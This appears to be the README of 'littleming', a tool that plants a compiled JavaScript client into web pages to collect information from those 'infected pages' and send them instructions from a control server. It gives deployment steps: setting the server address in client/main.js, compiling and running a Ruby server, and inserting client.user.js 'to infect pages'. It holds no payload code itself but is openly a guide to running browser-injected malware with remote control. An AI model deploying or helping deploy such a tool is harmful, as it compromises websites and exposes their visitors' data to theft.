littleming
==========

What it does
------------

* Collect information from infected pages
* Send instructions to infected pages

Deploy
------

Set http basic auth credentials in server.rb

Set variables in client/main.js

    var server = 'http://localhost:4567/'; // set to your server
    var logging = false; // false to disable logging

Set server port number in Rakefile

    port = 5000

Compile javascript assets

    $ rake server:assets:compile

Migrate the database if needed

    $ RACK_ENV=production rake server:db:migrate

Run the server

    $ RACK_ENV=production rake server:run

Compile the client

    $ rake client:compile

Insert the compiled client.user.js to infect pages.
